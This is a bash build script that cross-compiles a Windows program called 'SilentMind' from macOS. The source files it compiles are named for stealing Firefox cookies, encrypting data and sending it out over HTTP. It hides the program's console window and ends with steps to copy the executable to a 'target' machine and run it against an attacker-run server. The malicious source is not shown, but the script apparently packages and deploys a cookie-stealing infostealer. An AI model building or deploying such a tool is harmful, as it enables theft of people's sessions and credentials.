#!/bin/bash

# SilentMind Cross-Compilation Script for macOS to Windows
# This script compiles the C client for Windows from macOS

set -e  # Exit on any error

echo "🔨 SilentMind Cross-Compilation Script"
echo "======================================"

# Check if mingw-w64 is installed
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "❌ mingw-w64 not found. Installing via Homebrew..."
    if ! command -v brew &> /dev/null; then
        echo "❌ Homebrew not found. Please install Homebrew first:"
        echo "   /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
        exit 1
    fi
    brew install mingw-w64
    echo "✅ mingw-w64 installed"
fi

# Check if source files exist
if [ ! -f "client/main.c" ] || [ ! -f "client/encrypt.c" ] || [ ! -f "client/encrypt.h" ] || [ ! -f "client/exfil_http.c" ] || [ ! -f "client/firefox_cookies.c" ] || [ ! -f "client/firefox_cookies.h" ]; then
    echo "❌ Source files not found. Please run from the SilentMind root directory."
    exit 1
fi

echo "📁 Source files found"
echo "🔧 Compiling for Windows x64..."

# Compile the Windows executable
x86_64-w64-mingw32-gcc -I. client/main.c client/encrypt.c client/exfil_http.c client/firefox_cookies.c sqlite3.c -o silentmind.exe -lwininet -lcrypt32 -ladvapi32 -lshell32 -mwindows

if [ $? -eq 0 ]; then
    echo "✅ Compilation successful!"
    echo ""
    echo "📦 Files created:"
    echo "   - silentmind.exe (Windows executable)"
    echo ""
    echo "🚀 Next steps:"
    echo "   1. Copy silentmind.exe to your target Windows machine"
    echo "   2. Update server IP in client/main.c (line 165) if needed"
    echo "   3. Run the server:"
    echo "      - pip3 install -r requirements.txt"
    echo "      - python3 app.py"
    echo "   4. Run silentmind.exe on your target Windows machine"
    echo ""
    echo "⚠️  Note: Make sure your Windows machine can reach the server IP address"
else
    echo "❌ Compilation failed!"
    exit 1
fi
